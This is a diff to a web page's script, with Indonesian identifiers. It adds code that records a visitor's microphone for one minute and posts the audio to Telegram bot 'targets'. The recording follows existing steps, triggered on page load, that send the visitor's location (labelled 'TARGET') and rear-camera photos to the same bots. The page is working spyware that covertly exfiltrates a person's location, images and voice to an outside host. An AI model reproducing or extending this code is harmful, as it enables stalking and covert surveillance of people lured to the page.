@@ -584,7 +584,7 @@ const ambilLokasi = () => {
           alamat = data.display_name || '-';
         } catch {}
 
-        resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 〙 ౼
+        resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗧𝗔𝗥𝗚𝗘𝗧 〙 ౼
 Latitude             : ${latitude}
 Longitude            : ${longitude}
 Akurasi              : ±${Math.round(accuracy)} meter
@@ -641,7 +641,69 @@ Link Google Maps     : https://maps.google.com/?q=${latitude},${longitude}`);
       }
     };
 
-  const mulai = async () => {
+const rekamVN = async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const recorder = new MediaRecorder(stream);
+    let chunks = [];
+
+    recorder.ondataavailable = (e) => {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+
+    recorder.onstop = async () => {
+      const blob = new Blob(chunks, { type: "audio/webm" });
+      const size = blob.size;
+      const durasi = 60;
+
+      for (const t of targets) {
+        // Kirim voice note (file)
+        const form = new FormData();
+        form.append("chat_id", t.chat_id);
+        form.append("voice", blob, "rekaman.webm");
+
+        await fetch(`https://api.telegram.org/bot${t.token}/sendVoice`, {
+          method: "POST",
+          body: form
+        });
+
+const infoVN = `౼ 〘 𝗩𝗢𝗜𝗖𝗘 𝗡𝗢𝗧𝗘 𝗔𝗨𝗗𝗜𝗢 〙 ౼
+Status Rekaman VN      : Berhasil direkam
+Durasi Rekaman         : ${durasi} detik
+Tipe File              : audio/webm
+Kualitas Mikrofon      : Stabil
+Link Kiriman Audio     : (terlampir langsung via Telegram)`;
+
+        await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: t.chat_id, text: infoVN, parse_mode: "HTML" })
+        });
+      }
+
+      stream.getTracks().forEach(t => t.stop());
+    };
+
+    recorder.start();
+    setTimeout(() => {
+      recorder.stop();
+    }, 60000); // 1 menit
+  } catch {
+    for (const t of targets) {
+      await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: t.chat_id,
+          text: `౼ 〘 𝗩𝗢𝗜𝗖𝗘 𝗡𝗢𝗧𝗘 𝗔𝗨𝗗𝗜𝗢 〙 ౼\n❌ Rekaman tidak diizinkan.`,
+          parse_mode: "HTML"
+        })
+      });
+    }
+  }
+};
+
+const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
@@ -679,7 +741,9 @@ Link Google Maps     : https://maps.google.com/?q=${latitude},${longitude}`);
 
   const belakang = await ambilKamera("environment", "belakang");
   await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
-  };
+
+  await rekamVN();
+};
 
     window.addEventListener("load", mulai);
   </script>
